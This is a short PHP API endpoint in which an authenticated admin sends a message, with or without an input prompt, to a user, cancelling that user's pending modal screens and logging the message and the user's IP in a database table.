<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/tela_modales_helpers.php';
verificarAuth();

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$mensaje = trim($input['mensaje'] ?? '');
$tipo_mensaje = $input['tipo_mensaje'] ?? '';
$admin_id = $_SESSION['admin_id'];

if (empty($mensaje)) {
    jsonError('El mensaje no puede estar vacío');
}

if (!in_array($tipo_mensaje, ['con_input', 'sin_input'])) {
    jsonError('Tipo de mensaje no válido');
}

$user = verificarUsuarioExiste($pdo, $usuario_id, ['ip_real']);

try {
    cancelarTelasModalesPendientes($pdo, $usuario_id);

    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin 
        (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario) 
        VALUES (?, ?, ?, ?, ?)
    ");

    if ($stmt->execute([$usuario_id, $admin_id, $mensaje, $tipo_mensaje, $user['ip_real']])) {
        jsonResponse(['success' => true, 'mensaje_id' => $pdo->lastInsertId()]);
    } else {
        jsonError('Error al enviar mensaje', 500);
    }
} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
